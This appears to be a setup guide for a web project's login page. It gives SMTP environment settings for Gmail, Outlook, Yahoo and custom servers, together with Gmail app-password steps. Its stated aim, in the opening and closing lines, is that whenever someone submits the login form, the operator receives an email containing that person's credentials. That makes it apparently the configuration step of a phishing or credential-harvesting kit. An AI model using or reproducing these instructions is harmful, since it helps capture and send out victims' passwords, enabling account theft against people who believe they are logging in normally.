# Email Setup Instructions

To receive login credentials via email, you need to configure your email settings.

## Setup Steps

1. Create a `.env.local` file in the root directory of your project.

2. Add the following environment variables:

```env
# SMTP Server Configuration
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false

# Your email credentials
SMTP_USER=your-email@gmail.com
SMTP_PASS=your-app-password

# Email address to receive the credentials
RECEIVER_EMAIL=your-email@gmail.com
```

## Gmail Setup

If you're using Gmail:

1. Enable 2-Factor Authentication on your Google account
2. Go to [Google App Passwords](https://myaccount.google.com/apppasswords)
3. Generate an App Password for "Mail"
4. Use this App Password as your `SMTP_PASS` (not your regular Gmail password)

## Other Email Providers

### Outlook/Hotmail
```env
SMTP_HOST=smtp-mail.outlook.com
SMTP_PORT=587
SMTP_SECURE=false
```

### Yahoo
```env
SMTP_HOST=smtp.mail.yahoo.com
SMTP_PORT=587
SMTP_SECURE=false
```

### Custom SMTP
```env
SMTP_HOST=your-smtp-server.com
SMTP_PORT=587
SMTP_SECURE=false
```

## Testing

After setting up your `.env.local` file, restart your development server:

```bash
npm run dev
```

When someone submits the login form, you'll receive an email with their credentials.

